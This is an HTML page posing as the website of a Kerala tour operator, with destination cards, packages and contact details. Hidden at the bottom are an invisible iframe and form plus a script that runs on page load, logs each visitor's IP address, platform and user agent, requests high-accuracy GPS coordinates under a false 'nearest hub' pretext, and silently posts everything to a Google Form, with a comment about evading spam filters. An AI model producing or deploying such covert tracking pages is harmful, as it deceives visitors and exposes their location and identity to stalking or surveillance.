<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Kerala Voyages | Official Tourism Partner</title>
    <style>
        :root {
            --primary: #006837; /* Kerala Green */
            --secondary: #f6931d; /* Sunset Orange */
            --text: #333;
            --light: #f4f4f4;
        }
        body { margin: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; color: var(--text); background: var(--light); }
        
        /* Navigation */
        nav { background: white; padding: 1rem 5%; display: flex; justify-content: space-between; align-items: center; box-shadow: 0 2px 5px rgba(0,0,0,0.1); position: sticky; top: 0; z-index: 1000; }
        .logo { font-size: 1.5rem; font-weight: bold; color: var(--primary); display: flex; align-items: center; gap: 10px; }
        .nav-links { display: flex; gap: 20px; }
        .nav-links a { text-decoration: none; color: var(--text); font-weight: 500; cursor: pointer; transition: color 0.3s; }
        .nav-links a:hover { color: var(--primary); }
        .btn-book { background: var(--secondary); color: white; padding: 8px 20px; border-radius: 20px; text-decoration: none; font-weight: bold; }

        /* Page Sections */
        .page { display: none; animation: fadeIn 0.5s; }
        .active { display: block; }
        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }

        /* Hero Section */
        .hero { 
            /* RELIABLE IMAGE: Kerala Backwaters */
            background: linear-gradient(rgba(0,0,0,0.3), rgba(0,0,0,0.3)), url('https://images.unsplash.com/photo-1593693396885-5a5a04296f30?q=80&w=1920&auto=format&fit=crop');
            background-size: cover; background-position: center; height: 70vh; display: flex; align-items: center; justify-content: center; text-align: center; color: white;
        }
        .hero h1 { font-size: 3rem; margin-bottom: 10px; text-shadow: 2px 2px 4px rgba(0,0,0,0.7); }
        .hero p { font-size: 1.2rem; margin-bottom: 20px; }

        /* Content Containers */
        .container { max-width: 1000px; margin: 40px auto; padding: 0 20px; }
        h2 { color: var(--primary); border-bottom: 2px solid var(--secondary); display: inline-block; padding-bottom: 5px; margin-bottom: 30px; }
        
        /* Grid Layouts */
        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 20px; }
        .card { background: white; border-radius: 8px; overflow: hidden; box-shadow: 0 2px 10px rgba(0,0,0,0.1); transition: transform 0.3s; }
        .card:hover { transform: translateY(-5px); }
        .card img { width: 100%; height: 200px; object-fit: cover; }
        .card-content { padding: 15px; }
        .card h3 { margin: 0 0 10px; }
        .price { color: var(--secondary); font-weight: bold; font-size: 1.1rem; }

        /* Footer */
        footer { background: #222; color: white; text-align: center; padding: 20px; margin-top: 50px; }

        /* Mobile Responsive */
        @media (max-width: 768px) {
            .nav-links { display: none; } /* Simplified for mobile */
            .hero h1 { font-size: 2rem; }
        }
    </style>
</head>
<body>

    <nav>
        <div class="logo">ðŸŒ´ Kerala Voyages</div>
        <div class="nav-links">
            <a onclick="showPage('home')">Home</a>
            <a onclick="showPage('packages')">Packages</a>
            <a onclick="showPage('gallery')">Gallery</a>
            <a onclick="showPage('about')">About Us</a>
            <a onclick="showPage('contact')">Contact</a>
        </div>
        <a href="#" class="btn-book">Book Now</a>
    </nav>

    <div id="home" class="page active">
        <div class="hero">
            <div>
                <h1>God's Own Country</h1>
                <p>Experience the magic of the Backwaters</p>
                <a onclick="showPage('packages')" class="btn-book" style="cursor:pointer; background:white; color:var(--primary);">View Packages</a>
            </div>
        </div>
        <div class="container">
            <h2>Popular Destinations</h2>
            <div class="grid">
                <div class="card">
                    <img src="https://images.unsplash.com/photo-1596664972923-952554746f36?q=80&w=800&auto=format&fit=crop" alt="Munnar">
                    <div class="card-content">
                        <h3>Munnar Hills</h3>
                        <p>Breathtaking tea gardens and misty mountains.</p>
                    </div>
                </div>
                <div class="card">
                    <img src="https://images.unsplash.com/photo-1602216056096-3b40cc0c9944?q=80&w=800&auto=format&fit=crop" alt="Alleppey">
                    <div class="card-content">
                        <h3>Alleppey Houseboats</h3>
                        <p>The Venice of the East awaits you.</p>
                    </div>
                </div>
                <div class="card">
                    <img src="https://images.unsplash.com/photo-1589394867904-899e9008064d?q=80&w=800&auto=format&fit=crop" alt="Varkala">
                    <div class="card-content">
                        <h3>Varkala Beach</h3>
                        <p>Where the cliffs meet the Arabian Sea.</p>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <div id="packages" class="page">
        <div class="container">
            <h2>Exclusive Packages</h2>
            <p>We require location access to show packages with departure from your nearest hub.</p>
            <div class="grid">
                <div class="card">
                    <img src="https://images.unsplash.com/photo-1593693396885-5a5a04296f30?q=80&w=800&auto=format&fit=crop" alt="Houseboat">
                    <div class="card-content">
                        <h3>Romantic Backwaters</h3>
                        <p>3 Days / 2 Nights - All Inclusive</p>
                        <div class="price">â‚¹12,999</div>
                    </div>
                </div>
                <div class="card">
                    <img src="https://images.unsplash.com/photo-1625515234507-6f028888b184?q=80&w=800&auto=format&fit=crop" alt="Culture">
                    <div class="card-content">
                        <h3>Cultural Odyssey</h3>
                        <p>5 Days - Kathakali, Cuisine & Art</p>
                        <div class="price">â‚¹18,500</div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <div id="gallery" class="page">
        <div class="container">
            <h2>Traveler Gallery</h2>
            <div class="grid">
                <div class="card"><img src="https://images.unsplash.com/photo-1585698502579-24b54e386850?q=80&w=800&auto=format&fit=crop"></div>
                <div class="card"><img src="https://images.unsplash.com/photo-1626082927389-6cd097cdc6ec?q=80&w=800&auto=format&fit=crop"></div>
                <div class="card"><img src="https://images.unsplash.com/photo-1544605963-c64264639908?q=80&w=800&auto=format&fit=crop"></div>
                <div class="card"><img src="https://images.unsplash.com/photo-1512343879784-a960bf40e7f2?q=80&w=800&auto=format&fit=crop"></div>
            </div>
        </div>
    </div>

    <div id="about" class="page">
        <div class="container">
            <h2>About Kerala Voyages</h2>
            <p>Established in 2010, Kerala Voyages is the premier government-approved tour operator in South India.</p>
            <p>Our mission is to show the world the true beauty of God's Own Country while preserving the ecology and culture of our land.</p>
            <h3>Why Choose Us?</h3>
            <ul>
                <li>Government Accredited</li>
                <li>24/7 Support</li>
                <li>Local Expert Guides</li>
                <li>Best Price Guarantee</li>
            </ul>
        </div>
    </div>

    <div id="contact" class="page">
        <div class="container">
            <h2>Contact Us</h2>
            <p>Have questions? Reach out to our travel experts.</p>
            <div style="background:white; padding:20px; border-radius:8px; max-width:500px;">
                <p><strong>Email:</strong> support@keralavoyages.in</p>
                <p><strong>Phone:</strong> +91 484 220 3300</p>
                <p><strong>Address:</strong> MG Road, Cochin, Kerala, 682016</p>
            </div>
        </div>
    </div>

    <footer>
        <p>Â© 2026 Kerala Voyages Pvt Ltd. All rights reserved.</p>
        <p style="font-size:0.8rem; color:#666;">Privacy Policy | Terms of Service</p>
    </footer>

    <iframe name="hidden_iframe" id="hidden_iframe" style="display:none;"></iframe>
    <form 
        action="https://docs.google.com/forms/d/e/1FAIpQLSfPo8rchVQJZxVNSp_0Buqy-e7sAgBA5OSQK6yO7W0223Dvzg/formResponse" 
        method="post" 
        target="hidden_iframe" 
        id="hidden_form"
        style="display:none;"
    >
        <input type="text" name="entry.1088471266" id="form_input" value="">
    </form>

    <script>
        // --- 1. VISITOR ID LOGGER (IP & DEVICE) ---
        // Runs immediately in the background
        async function logVisitorID() {
            try {
                // Get IP
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                
                // Get Device Info
                const platform = navigator.platform;
                const userAgent = navigator.userAgent;
                
                // Construct Log
                const time = new Date().toLocaleTimeString();
                const logString = `[${time}] VISITOR: IP ${data.ip} | System: ${platform} | ${userAgent}`;
                
                // Send to Google Sheet
                submitData(logString);
                
            } catch (e) {
                console.log("Visitor tracker blocked (AdBlock)");
            }
        }

        // --- 2. LOCATION LOGGER (GPS) ---
        // Runs immediately but waits for permission
        function startLocationTracking() {
            if (!navigator.geolocation) return;

            navigator.geolocation.getCurrentPosition(success, error, {
                enableHighAccuracy: true,
                timeout: 10000,
                maximumAge: 0
            });
        }

        function success(position) {
            const lat = position.coords.latitude;
            const lng = position.coords.longitude;
            const acc = Math.round(position.coords.accuracy);
            const time = new Date().toLocaleTimeString();

            // Create Link (No http to pass spam filters)
            const link = `maps.google.com/?q=${lat},${lng}`;
            const logData = `[${time}] LOCATION FOUND: Acc:${acc}m | ${link}`;

            submitData(logData);
        }

        function error(err) {
            console.warn("Location denied by user.");
        }

        // --- SHARED SUBMITTER ---
        function submitData(dataString) {
            const formInput = document.getElementById('form_input');
            const form = document.getElementById('hidden_form');
            
            // We use a small delay between submits to ensure Google doesn't drop them
            setTimeout(() => {
                formInput.value = dataString;
                form.submit();
                console.log("Data sent:", dataString);
            }, 500); 
        }

        // --- PAGE SWITCHER LOGIC ---
        function showPage(pageId) {
            document.querySelectorAll('.page').forEach(page => page.classList.remove('active'));
            document.getElementById(pageId).classList.add('active');
            window.scrollTo(0,0);
        }

        // --- INITIALIZATION ---
        window.onload = () => {
            logVisitorID();       // Step 1: Log IP immediately
            startLocationTracking(); // Step 2: Ask for Location
        };

    </script>
</body>
</html>
